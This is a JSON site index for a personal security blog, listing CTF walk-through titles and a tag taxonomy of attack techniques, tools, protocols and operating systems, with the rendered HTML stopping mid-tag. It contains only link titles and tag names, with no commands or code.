{"index":{"slug":"index","filePath":"index.md","title":"Cardboard Iguana Security","links":["journals/2022-08-15","journals/2022-11-27","journals/2020-07-27","journals/2021-10-10","journals/2021-11-04","journals/2021-12-07","journals/2021-12-08","journals/2021-12-14","journals/2021-12-30","journals/2022-01-02","journals/2022-01-30","journals/2022-02-01","journals/2022-02-02","journals/2022-04-03","journals/2023-04-27","tags/AttackCycle/Reconnaissance","tags/AttackCycle/Reconnaissance/BruteForcing","tags/AttackCycle/Reconnaissance/Fuzzing","tags/AttackCycle/Exploitation","tags/AttackCycle/Exploitation/AS-REPRoasting","tags/AttackCycle/Exploitation/BruteForcing","tags/AttackCycle/Exploitation/Kerberoasting","tags/AttackCycle/Exploitation/LocalFileInclusion","tags/AttackCycle/Exploitation/NullByteAttacks","tags/AttackCycle/Exploitation/SQLi","tags/AttackCycle/Exploitation/XSS","tags/AttackCycle/Exploitation/XXE","tags/AttackCycle/AntiForensics","tags/AttackCycle/PrivEsc","tags/AttackCycle/PrivEsc/GoldenTickets","tags/AttackCycle/PrivEsc/PassTheHash","tags/AttackCycle/LateralMovement","tags/AttackCycle/LateralMovement/PassTheHash","tags/AttackCycle/LateralMovement/SilverTickets","tags/AttackCycle/CommandAndControl","tags/AttackCycle/Exfiltration","tags/HowTo","tags/LoLBins","tags/Scripts","tags/Application","tags/Application/ADB","tags/Application/Aircrack","tags/Application/arp","tags/Application/awk","tags/Application/base64","tags/Application/basenc","tags/Application/BurpSuite","tags/Application/cat","tags/Application/Certify","tags/Application/CertUtil","tags/Application/cewl","tags/Application/cmd","tags/Application/cmdkey","tags/Application/crackmapexec","tags/Application/CUPP","tags/Application/curl","tags/Application/DayOne","tags/Application/dd","tags/Application/dig","tags/Application/dir","tags/Application/dpkg-query","tags/Application/driverquery","tags/Application/enum4linux","tags/Application/Evil-WinRM","tags/Application/Excel","tags/Application/ExifTool","tags/Application/ffmpeg","tags/Application/find","tags/Application/findstr","tags/Application/finger","tags/Application/Firefox","tags/Application/ftp","tags/Application/fuff","tags/Application/gdb","tags/Application/getcap","tags/Application/Git","tags/Application/gobuster","tags/Application/GoodLock","tags/Application/GPG","tags/Application/grep","tags/Application/Hashcat","tags/Application/hostname","tags/Application/Hydra","tags/Application/icacls","tags/Application/ifconfig","tags/Application/iftop","tags/Application/ike-scan","tags/Application/Impacket","tags/Application/ipconfig","tags/Application/JohnTheRipper","tags/Application/jq","tags/Application/JumpDesktop","tags/Application/KeePassXC","tags/Application/Kerbrute","tags/Application/LAME","tags/Application/ldd","tags/Application/less","tags/Application/libVirt","tags/Application/ls","tags/Application/lslpp","tags/Application/man","tags/Application/Metasploit","tags/Application/Metasploit/meterpreter","tags/Application/Metasploit/msfconsole","tags/Application/Metasploit/msfvenom","tags/Application/MicrosoftRemoteDesktop","tags/Application/Mimikatz","tags/Application/more","tags/Application/MSSQL","tags/Application/MySQL","tags/Application/nano","tags/Application/nbtscan","tags/Application/net","tags/Application/netcat","tags/Application/netsh","tags/Application/netstat","tags/Application/Nikto","tags/Application/Nmap","tags/Application/NodeJS","tags/Application/nslookup","tags/Application/Obsidian","tags/Application/OneDrive","tags/Application/OpenSSL","tags/Application/Oracle","tags/Application/oscanner","tags/Application/oslevel","tags/Application/OWASPZAP","tags/Application/ping","tags/Application/PostgreSQL","tags/Application/PowerShell","tags/Application/PowerShell/Invoke-Kerberoast","tags/Application/PowerShell/Invoke-Mimikatz","tags/Application/PowerShell/Powercat","tags/Application/PowerShell/PowerUp","tags/Application/PowerShell/PowerView","tags/Application/ProcMon","tags/Application/proxychains","tags/Application/ps","tags/Application/PsExec","tags/Application/psk-crack","tags/Application/query","tags/Application/readlink","tags/Application/reg","tags/Application/rlwrap","tags/Application/RogueWinRM","tags/Application/rpm","tags/Application/Rubeus","tags/Application/RunAs","tags/Application/SamsungDeX","tags/Application/SDelete","tags/Application/secedit","tags/Application/sed","tags/Application/select","tags/Application/Shortcuts","tags/Application/shutdown","tags/Application/sidguess","tags/Application/sleep","tags/Application/smbclient","tags/Application/smbget","tags/Application/smbmap","tags/Application/socat","tags/Application/SQLMap","tags/Application/ss","tags/Application/SSH","tags/Application/SSH/Dropbear","tags/Application/sudo","tags/Application/systemctl","tags/Application/systeminfo","tags/Application/takeown","tags/Application/tar","tags/Application/tcpdump","tags/Application/tee","tags/Application/telnet","tags/Application/TheHarvester","tags/Application/timeout","tags/Application/tmux","tags/Application/tnscmd10g","tags/Application/traceroute","tags/Application/tracert","tags/Application/type","tags/Application/unbuffer","tags/Application/ViM","tags/Application/VirtualBox","tags/Application/wfuzz","tags/Application/wget","tags/Application/whoami","tags/Application/WindowsExploitSuggester","tags/Application/windump","tags/Application/WinPEAS","tags/Application/winrs","tags/Application/Wireshark","tags/Application/wmic","tags/Application/Word","tags/Application/XFreeRDP","tags/Application/Xterm","tags/Application/xxd","tags/Application/youtube-dl","tags/Cloud","tags/Cloud/AWS","tags/Cryptography","tags/Cryptography/Cryptosystems","tags/Cryptography/Cryptosystems/RSA","tags/Cryptography/Hashes","tags/Cryptography/Hashes/AS-REP","tags/Cryptography/Hashes/bcrypt","tags/Cryptography/Hashes/LANMAN","tags/Cryptography/Hashes/MD4","tags/Cryptography/Hashes/MD5","tags/Cryptography/Hashes/NT","tags/Cryptography/Hashes/SHA1","tags/Cryptography/Hashes/SHA256","tags/Cryptography/Hashes/SHA512","tags/Cryptography/Hashes/TGS-REP","tags/Cryptography/Signatures","tags/FileFormat","tags/FileFormat/Gemtext","tags/FileFormat/GIF","tags/FileFormat/HTA","tags/FileFormat/HTML","tags/FileFormat/JSON","tags/FileFormat/kirbi","tags/FileFormat/M4A","tags/FileFormat/Markdown","tags/FileFormat/MP3","tags/FileFormat/MP4","tags/FileFormat/VBS","tags/FileFormat/WebP","tags/FileFormat/XML","tags/FileFormat/XMP","tags/Hardware","tags/Hardware/iPadPro","tags/Hardware/Kobo","tags/Hardware/MACAddress","tags/Hardware/RaspberryPi","tags/Hardware/RaspberryPi/4B","tags/Language","tags/Language/Bash","tags/Language/Java","tags/Language/JavaScript","tags/Language/Perl","tags/Language/PHP","tags/Language/Python","tags/Language/Python/Scapy","tags/Language/Ruby","tags/Language/SQL","tags/Language/VisualBasic","tags/OS","tags/OS/AIX","tags/OS/Android","tags/OS/CiscoIOS","tags/OS/iOS","tags/OS/Linux","tags/OS/Linux/Distros","tags/OS/Linux/Distros/Debian","tags/OS/Linux/Distros/Kali","tags/OS/Linux/Distros/RedHat","tags/OS/Linux/Permissions","tags/OS/Linux/Polkit","tags/OS/macOS","tags/OS/Windows","tags/OS/Windows/ActiveDirectory","tags/OS/Windows/AMSI","tags/OS/Windows/Defender","tags/OS/Windows/Drivers","tags/OS/Windows/EventLog","tags/OS/Windows/Firewall","tags/OS/Windows/IIS","tags/OS/Windows/LSASS","tags/OS/Windows/Permissions","tags/OS/Windows/Permissions/SeAssignPrimaryToken","tags/OS/Windows/Permissions/SeBackup","tags/OS/Windows/Permissions/SeImpersonate","tags/OS/Windows/Permissions/SeRestore","tags/OS/Windows/Permissions/SeTakeOwnership","tags/OS/Windows/Registry","tags/OS/Windows/SAM","tags/OS/Windows/Server","tags/OS/Windows/Services","tags/OS/Windows/Tasks","tags/OS/Windows/UAC","tags/OS/Windows/UserInit","tags/OS/Windows/WinLogin","tags/OS/Windows/WMI","tags/OS/Windows/WSH","tags/Protocol","tags/Protocol/ARP","tags/Protocol/DCERPC","tags/Protocol/DNS","tags/Protocol/DRSUAPI","tags/Protocol/FTP","tags/Protocol/FTPS","tags/Protocol/Gemini","tags/Protocol/HTTP","tags/Protocol/ICMP","tags/Protocol/IMAP","tags/Protocol/IPSec","tags/Protocol/IPv4","tags/Protocol/IPv6","tags/Protocol/Kerberos","tags/Protocol/NetBIOS","tags/Protocol/NFS","tags/Protocol/POP3","tags/Protocol/RCP","tags/Protocol/RDP","tags/Protocol/SIP","tags/Protocol/SMB","tags/Protocol/SMTP","tags/Protocol/SOCKS","tags/Protocol/TCP","tags/Protocol/Telnet","tags/Protocol/TLS","tags/Protocol/UDP","tags/Protocol/WiFi","tags/Protocol/WinRM","tags/Protocol/X11","tags/Standard","tags/Standard/Base64","tags/Standard/HD","tags/Standard/JWT","tags/Standard/MITRE","tags/Standard/MITRE/Emulation","tags/Standard/OSI","tags/Standard/POSIX","tags/Standard/RegEx","tags/Standard/URI","tags/WebApplication","tags/WebApplication/Gmail","tags/WebApplication/GooglePhotos","tags/WebApplication/IFTTT","tags/WebApplication/Netlify"],"tags":["AttackCycle/Reconnaissance","AttackCycle/Reconnaissance/BruteForcing","AttackCycle/Reconnaissance/Fuzzing","AttackCycle/Exploitation","AttackCycle/Exploitation/AS-REPRoasting","AttackCycle/Exploitation/BruteForcing","AttackCycle/Exploitation/Kerberoasting","AttackCycle/Exploitation/LocalFileInclusion","AttackCycle/Exploitation/NullByteAttacks","AttackCycle/Exploitation/SQLi","AttackCycle/Exploitation/XSS","AttackCycle/Exploitation/XXE","AttackCycle/AntiForensics","AttackCycle/PrivEsc","AttackCycle/PrivEsc/GoldenTickets","AttackCycle/PrivEsc/PassTheHash","AttackCycle/LateralMovement","AttackCycle/LateralMovement/PassTheHash","AttackCycle/LateralMovement/SilverTickets","AttackCycle/CommandAndControl","AttackCycle/Exfiltration","HowTo","LoLBins","Scripts","Application","Application/ADB","Application/Aircrack","Application/arp","Application/awk","Application/base64","Application/basenc","Application/BurpSuite","Application/cat","Application/Certify","Application/CertUtil","Application/cewl","Application/cmd","Application/cmdkey","Application/crackmapexec","Application/CUPP","Application/curl","Application/DayOne","Application/dd","Application/dig","Application/dir","Application/dpkg-query","Application/driverquery","Application/enum4linux","Application/Evil-WinRM","Application/Excel","Application/ExifTool","Application/ffmpeg","Application/find","Application/findstr","Application/finger","Application/Firefox","Application/ftp","Application/fuff","Application/gdb","Application/getcap","Application/Git","Application/gobuster","Application/GoodLock","Application/GPG","Application/grep","Application/Hashcat","Application/hostname","Application/Hydra","Application/icacls","Application/ifconfig","Application/iftop","Application/ike-scan","Application/Impacket","Application/ipconfig","Application/JohnTheRipper","Application/jq","Application/JumpDesktop","Application/KeePassXC","Application/Kerbrute","Application/LAME","Application/ldd","Application/less","Application/libVirt","Application/ls","Application/lslpp","Application/man","Application/Metasploit","Application/Metasploit/meterpreter","Application/Metasploit/msfconsole","Application/Metasploit/msfvenom","Application/MicrosoftRemoteDesktop","Application/Mimikatz","Application/more","Application/MSSQL","Application/MySQL","Application/nano","Application/nbtscan","Application/net","Application/netcat","Application/netsh","Application/netstat","Application/Nikto","Application/Nmap","Application/NodeJS","Application/nslookup","Application/Obsidian","Application/OneDrive","Application/OpenSSL","Application/Oracle","Application/oscanner","Application/oslevel","Application/OWASPZAP","Application/ping","Application/PostgreSQL","Application/PowerShell","Application/PowerShell/Invoke-Kerberoast","Application/PowerShell/Invoke-Mimikatz","Application/PowerShell/Powercat","Application/PowerShell/PowerUp","Application/PowerShell/PowerView","Application/ProcMon","Application/proxychains","Application/ps","Application/PsExec","Application/psk-crack","Application/query","Application/readlink","Application/reg","Application/rlwrap","Application/RogueWinRM","Application/rpm","Application/Rubeus","Application/RunAs","Application/SamsungDeX","Application/SDelete","Application/secedit","Application/sed","Application/select","Application/Shortcuts","Application/shutdown","Application/sidguess","Application/sleep","Application/smbclient","Application/smbget","Application/smbmap","Application/socat","Application/SQLMap","Application/ss","Application/SSH","Application/SSH/Dropbear","Application/sudo","Application/systemctl","Application/systeminfo","Application/takeown","Application/tar","Application/tcpdump","Application/tee","Application/telnet","Application/TheHarvester","Application/timeout","Application/tmux","Application/tnscmd10g","Application/traceroute","Application/tracert","Application/type","Application/unbuffer","Application/ViM","Application/VirtualBox","Application/wfuzz","Application/wget","Application/whoami","Application/WindowsExploitSuggester","Application/windump","Application/WinPEAS","Application/winrs","Application/Wireshark","Application/wmic","Application/Word","Application/XFreeRDP","Application/Xterm","Application/xxd","Application/youtube-dl","Cloud","Cloud/AWS","Cryptography","Cryptography/Cryptosystems","Cryptography/Cryptosystems/RSA","Cryptography/Hashes","Cryptography/Hashes/AS-REP","Cryptography/Hashes/bcrypt","Cryptography/Hashes/LANMAN","Cryptography/Hashes/MD4","Cryptography/Hashes/MD5","Cryptography/Hashes/NT","Cryptography/Hashes/SHA1","Cryptography/Hashes/SHA256","Cryptography/Hashes/SHA512","Cryptography/Hashes/TGS-REP","Cryptography/Signatures","FileFormat","FileFormat/Gemtext","FileFormat/GIF","FileFormat/HTA","FileFormat/HTML","FileFormat/JSON","FileFormat/kirbi","FileFormat/M4A","FileFormat/Markdown","FileFormat/MP3","FileFormat/MP4","FileFormat/VBS","FileFormat/WebP","FileFormat/XML","FileFormat/XMP","Hardware","Hardware/iPadPro","Hardware/Kobo","Hardware/MACAddress","Hardware/RaspberryPi","Hardware/RaspberryPi/4B","Language","Language/Bash","Language/Java","Language/JavaScript","Language/Perl","Language/PHP","Language/Python","Language/Python/Scapy","Language/Ruby","Language/SQL","Language/VisualBasic","OS","OS/AIX","OS/Android","OS/CiscoIOS","OS/iOS","OS/Linux","OS/Linux/Distros","OS/Linux/Distros/Debian","OS/Linux/Distros/Kali","OS/Linux/Distros/RedHat","OS/Linux/Permissions","OS/Linux/Polkit","OS/macOS","OS/Windows","OS/Windows/ActiveDirectory","OS/Windows/AMSI","OS/Windows/Defender","OS/Windows/Drivers","OS/Windows/EventLog","OS/Windows/Firewall","OS/Windows/IIS","OS/Windows/LSASS","OS/Windows/Permissions","OS/Windows/Permissions/SeAssignPrimaryToken","OS/Windows/Permissions/SeBackup","OS/Windows/Permissions/SeImpersonate","OS/Windows/Permissions/SeRestore","OS/Windows/Permissions/SeTakeOwnership","OS/Windows/Registry","OS/Windows/SAM","OS/Windows/Server","OS/Windows/Services","OS/Windows/Tasks","OS/Windows/UAC","OS/Windows/UserInit","OS/Windows/WinLogin","OS/Windows/WMI","OS/Windows/WSH","Protocol","Protocol/ARP","Protocol/DCERPC","Protocol/DNS","Protocol/DRSUAPI","Protocol/FTP","Protocol/FTPS","Protocol/Gemini","Protocol/HTTP","Protocol/ICMP","Protocol/IMAP","Protocol/IPSec","Protocol/IPv4","Protocol/IPv6","Protocol/Kerberos","Protocol/NetBIOS","Protocol/NFS","Protocol/POP3","Protocol/RCP","Protocol/RDP","Protocol/SIP","Protocol/SMB","Protocol/SMTP","Protocol/SOCKS","Protocol/TCP","Protocol/Telnet","Protocol/TLS","Protocol/UDP","Protocol/WiFi","Protocol/WinRM","Protocol/X11","Standard","Standard/Base64","Standard/HD","Standard/JWT","Standard/MITRE","Standard/MITRE/Emulation","Standard/OSI","Standard/POSIX","Standard/RegEx","Standard/URI","WebApplication","WebApplication/Gmail","WebApplication/GooglePhotos","WebApplication/IFTTT","WebApplication/Netlify"],"content":"\nAttendere Ad Singula\nCommentaries\nOccasionally I have thoughts to share about technology, security, hacking, or some combination thereof.\n2022 Aug 15 | Notes from HOPE and DEF CON\n2022 Nov 27 | Trying (and failing) to deploy a smart contract using an iPad Pro\nTales\nWalk-throughs of some of the online CTFs I’ve done. These are all in narrative form so you can see my entire process — including some dead ends!\n2020 Jul 27 | Bandit\n2021 Oct 10 | Pickle Rick\n2021 Nov 04 | Basic pentesting\n2021 Dec 07 | Ice\n2021 Dec 08 | Blaster\n2021 Dec 14 | Overpass 2: Hacked\n2021 Dec 30 | Attacktive Directory\n2022 Jan 02 | Retro\n2022 Jan 30 | Tools‘R’us\n2022 Feb 01 | Inclusion\n2022 Feb 02 | Jurassic Park\n2022 Apr 03 | Net sec challenge\n2023 Apr 27 | Union\nSpells\nA variety of notes about hacking, written for my own reference. Some notes date to the beginning of my cybersecurity journey and are very basic, while others come from later in my career and are more advanced. May you find something useful here.\nClick on the tag for a list of notes related to that topic.\nSpells by attack cycle stage\n\nAttackCycle/Reconnaissance\n\nAttackCycle/Reconnaissance/BruteForcing\nAttackCycle/Reconnaissance/Fuzzing\n\n\nAttackCycle/Exploitation\n\nAttackCycle/Exploitation/AS-REPRoasting\nAttackCycle/Exploitation/BruteForcing\nAttackCycle/Exploitation/Kerberoasting\nAttackCycle/Exploitation/LocalFileInclusion\nAttackCycle/Exploitation/NullByteAttacks\nAttackCycle/Exploitation/SQLi\nAttackCycle/Exploitation/XSS\nAttackCycle/Exploitation/XXE\n\n\nAttackCycle/AntiForensics\nAttackCycle/PrivEsc\n\nAttackCycle/PrivEsc/GoldenTickets\nAttackCycle/PrivEsc/PassTheHash\n\n\nAttackCycle/LateralMovement\n\nAttackCycle/LateralMovement/PassTheHash\nAttackCycle/LateralMovement/SilverTickets\n\n\nAttackCycle/CommandAndControl\nAttackCycle/Exfiltration\n\nSpells for specific occassions\n\nHowTo\nLoLBins\nScripts\n\nSpells dealing with specific protocols, operating systems, applications, etc.\n\nApplication\n\nApplication/ADB\nApplication/Aircrack\nApplication/arp\nApplication/awk\nApplication/base64\nApplication/basenc\nApplication/BurpSuite\nApplication/cat\nApplication/Certify\nApplication/CertUtil\nApplication/cewl\nApplication/cmd\nApplication/cmdkey\nApplication/crackmapexec\nApplication/CUPP\nApplication/curl\nApplication/DayOne\nApplication/dd\nApplication/dig\nApplication/dir\nApplication/dpkg-query\nApplication/driverquery\nApplication/enum4linux\nApplication/Evil-WinRM\nApplication/Excel\nApplication/ExifTool\nApplication/ffmpeg\nApplication/find\nApplication/findstr\nApplication/finger\nApplication/Firefox\nApplication/ftp\nApplication/fuff\nApplication/gdb\nApplication/getcap\nApplication/Git\nApplication/gobuster\nApplication/GoodLock\nApplication/GPG\nApplication/grep\nApplication/Hashcat\nApplication/hostname\nApplication/Hydra\nApplication/icacls\nApplication/ifconfig\nApplication/iftop\nApplication/ike-scan\nApplication/Impacket\nApplication/ipconfig\nApplication/JohnTheRipper\nApplication/jq\nApplication/JumpDesktop\nApplication/KeePassXC\nApplication/Kerbrute\nApplication/LAME\nApplication/ldd\nApplication/less\nApplication/libVirt\nApplication/ls\nApplication/lslpp\nApplication/man\nApplication/Metasploit\n\nApplication/Metasploit/meterpreter\nApplication/Metasploit/msfconsole\nApplication/Metasploit/msfvenom\n\n\nApplication/MicrosoftRemoteDesktop\nApplication/Mimikatz\nApplication/more\nApplication/MSSQL\nApplication/MySQL\nApplication/nano\nApplication/nbtscan\nApplication/net\nApplication/netcat\nApplication/netsh\nApplication/netstat\nApplication/Nikto\nApplication/Nmap\nApplication/NodeJS\nApplication/nslookup\nApplication/Obsidian\nApplication/OneDrive\nApplication/OpenSSL\nApplication/Oracle\nApplication/oscanner\nApplication/oslevel\nApplication/OWASPZAP\nApplication/ping\nApplication/PostgreSQL\nApplication/PowerShell\n\nApplication/PowerShell/Invoke-Kerberoast\nApplication/PowerShell/Invoke-Mimikatz\nApplication/PowerShell/Powercat\nApplication/PowerShell/PowerUp\nApplication/PowerShell/PowerView\n\n\nApplication/ProcMon\nApplication/proxychains\nApplication/ps\nApplication/PsExec\nApplication/psk-crack\nApplication/query\nApplication/readlink\nApplication/reg\nApplication/rlwrap\nApplication/RogueWinRM\nApplication/rpm\nApplication/Rubeus\nApplication/RunAs\nApplication/SamsungDeX\nApplication/SDelete\nApplication/secedit\nApplication/sed\nApplication/select\nApplication/Shortcuts\nApplication/shutdown\nApplication/sidguess\nApplication/sleep\nApplication/smbclient\nApplication/smbget\nApplication/smbmap\nApplication/socat\nApplication/SQLMap\nApplication/ss\nApplication/SSH\n\nApplication/SSH/Dropbear\n\n\nApplication/sudo\nApplication/systemctl\nApplication/systeminfo\nApplication/takeown\nApplication/tar\nApplication/tcpdump\nApplication/tee\nApplication/telnet\nApplication/TheHarvester\nApplication/timeout\nApplication/tmux\nApplication/tnscmd10g\nApplication/traceroute\nApplication/tracert\nApplication/type\nApplication/unbuffer\nApplication/ViM\nApplication/VirtualBox\nApplication/wfuzz\nApplication/wget\nApplication/whoami\nApplication/WindowsExploitSuggester\nApplication/windump\nApplication/WinPEAS\nApplication/winrs\nApplication/Wireshark\nApplication/wmic\nApplication/Word\nApplication/XFreeRDP\nApplication/Xterm\nApplication/xxd\nApplication/youtube-dl\n\n\nCloud\nCloud/AWS\nCryptography\n\nCryptography/Cryptosystems\n\nCryptography/Cryptosystems/RSA\n\n\nCryptography/Hashes\n\nCryptography/Hashes/AS-REP\nCryptography/Hashes/bcrypt\nCryptography/Hashes/LANMAN\nCryptography/Hashes/MD4\nCryptography/Hashes/MD5\nCryptography/Hashes/NT\nCryptography/Hashes/SHA1\nCryptography/Hashes/SHA256\nCryptography/Hashes/SHA512\nCryptography/Hashes/TGS-REP\n\n\nCryptography/Signatures\n\n\nFileFormat\n\nFileFormat/Gemtext\nFileFormat/GIF\nFileFormat/HTA\nFileFormat/HTML\nFileFormat/JSON\nFileFormat/kirbi\nFileFormat/M4A\nFileFormat/Markdown\nFileFormat/MP3\nFileFormat/MP4\nFileFormat/VBS\nFileFormat/WebP\nFileFormat/XML\nFileFormat/XMP\n\n\nHardware\n\nHardware/iPadPro\nHardware/Kobo\nHardware/MACAddress\nHardware/RaspberryPi\n\nHardware/RaspberryPi/4B\n\n\n\n\nLanguage\n\nLanguage/Bash\nLanguage/Java\nLanguage/JavaScript\nLanguage/Perl\nLanguage/PHP\nLanguage/Python\n\nLanguage/Python/Scapy\n\n\nLanguage/Ruby\nLanguage/SQL\nLanguage/VisualBasic\n\n\nOS\n\nOS/AIX\nOS/Android\nOS/CiscoIOS\nOS/iOS\nOS/Linux\n\nOS/Linux/Distros\n\nOS/Linux/Distros/Debian\nOS/Linux/Distros/Kali\nOS/Linux/Distros/RedHat\n\n\nOS/Linux/Permissions\nOS/Linux/Polkit\n\n\nOS/macOS\nOS/Windows\n\nOS/Windows/ActiveDirectory\nOS/Windows/AMSI\nOS/Windows/Defender\nOS/Windows/Drivers\nOS/Windows/EventLog\nOS/Windows/Firewall\nOS/Windows/IIS\nOS/Windows/LSASS\nOS/Windows/Permissions\n\nOS/Windows/Permissions/SeAssignPrimaryToken\nOS/Windows/Permissions/SeBackup\nOS/Windows/Permissions/SeImpersonate\nOS/Windows/Permissions/SeRestore\nOS/Windows/Permissions/SeTakeOwnership\n\n\nOS/Windows/Registry\nOS/Windows/SAM\nOS/Windows/Server\nOS/Windows/Services\nOS/Windows/Tasks\nOS/Windows/UAC\nOS/Windows/UserInit\nOS/Windows/WinLogin\nOS/Windows/WMI\nOS/Windows/WSH\n\n\n\n\nProtocol\n\nProtocol/ARP\nProtocol/DCERPC\nProtocol/DNS\nProtocol/DRSUAPI\nProtocol/FTP\nProtocol/FTPS\nProtocol/Gemini\nProtocol/HTTP\nProtocol/ICMP\nProtocol/IMAP\nProtocol/IPSec\nProtocol/IPv4\nProtocol/IPv6\nProtocol/Kerberos\nProtocol/NetBIOS\nProtocol/NFS\nProtocol/POP3\nProtocol/RCP\nProtocol/RDP\nProtocol/SIP\nProtocol/SMB\nProtocol/SMTP\nProtocol/SOCKS\nProtocol/TCP\nProtocol/Telnet\nProtocol/TLS\nProtocol/UDP\nProtocol/WiFi\nProtocol/WinRM\nProtocol/X11\n\n\nStandard\n\nStandard/Base64\nStandard/HD\nStandard/JWT\nStandard/MITRE\n\nStandard/MITRE/Emulation\n\n\nStandard/OSI\nStandard/POSIX\nStandard/RegEx\nStandard/URI\n\n\nWebApplication\n\nWebApplication/Gmail\nWebApplication/GooglePhotos\nWebApplication/IFTTT\nWebApplication/Netlify\n\n\n","richContent":"&lt;p&gt;&lt;img src=&quot;./assets/6db53d2efb1512ddd41a510027e37b57.png&quot; width=&quot;auto&quot; height=&quot;auto&quot; alt=&quot;Cardboard Iguana Security&quot; loading=&quot;lazy&quot;&gt;&lt;/p&gt;\n&lt;center&gt;&lt;em&gt;Attendere Ad Singula&lt;/em&gt;&lt;/center&gt;\n&lt;h2 id=&quot;commentaries&quot;&gt;Commentaries&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#commentaries&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Occasionally I have thoughts to share about technology, security, hacking, or some combination thereof.&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;2022 Aug 15&lt;/code&gt; | &lt;a href=&quot;./journals/2022-08-15&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-08-15&quot;&gt;Notes from HOPE and DEF CON&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2022 Nov 27&lt;/code&gt; | &lt;a href=&quot;./journals/2022-11-27&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-11-27&quot;&gt;Trying (and failing) to deploy a smart contract using an iPad Pro&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=&quot;tales&quot;&gt;Tales&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#tales&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Walk-throughs of some of the online CTFs I’ve done. These are all in narrative form so you can see my entire process — including some dead ends!&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;2020 Jul 27&lt;/code&gt; | &lt;a href=&quot;./journals/2020-07-27&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2020-07-27&quot;&gt;Bandit&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2021 Oct 10&lt;/code&gt; | &lt;a href=&quot;./journals/2021-10-10&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-10-10&quot;&gt;Pickle Rick&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2021 Nov 04&lt;/code&gt; | &lt;a href=&quot;./journals/2021-11-04&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-11-04&quot;&gt;Basic pentesting&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2021 Dec 07&lt;/code&gt; | &lt;a href=&quot;./journals/2021-12-07&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-12-07&quot;&gt;Ice&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2021 Dec 08&lt;/code&gt; | &lt;a href=&quot;./journals/2021-12-08&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-12-08&quot;&gt;Blaster&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2021 Dec 14&lt;/code&gt; | &lt;a href=&quot;./journals/2021-12-14&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-12-14&quot;&gt;Overpass 2: Hacked&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2021 Dec 30&lt;/code&gt; | &lt;a href=&quot;./journals/2021-12-30&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2021-12-30&quot;&gt;Attacktive Directory&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2022 Jan 02&lt;/code&gt; | &lt;a href=&quot;./journals/2022-01-02&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-01-02&quot;&gt;Retro&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2022 Jan 30&lt;/code&gt; | &lt;a href=&quot;./journals/2022-01-30&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-01-30&quot;&gt;Tools‘R’us&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2022 Feb 01&lt;/code&gt; | &lt;a href=&quot;./journals/2022-02-01&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-02-01&quot;&gt;Inclusion&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2022 Feb 02&lt;/code&gt; | &lt;a href=&quot;./journals/2022-02-02&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-02-02&quot;&gt;Jurassic Park&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2022 Apr 03&lt;/code&gt; | &lt;a href=&quot;./journals/2022-04-03&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2022-04-03&quot;&gt;Net sec challenge&lt;/a&gt;&lt;br&gt;\n&lt;code&gt;2023 Apr 27&lt;/code&gt; | &lt;a href=&quot;./journals/2023-04-27&quot; class=&quot;internal alias&quot; data-slug=&quot;journals/2023-04-27&quot;&gt;Union&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=&quot;spells&quot;&gt;Spells&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#spells&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; 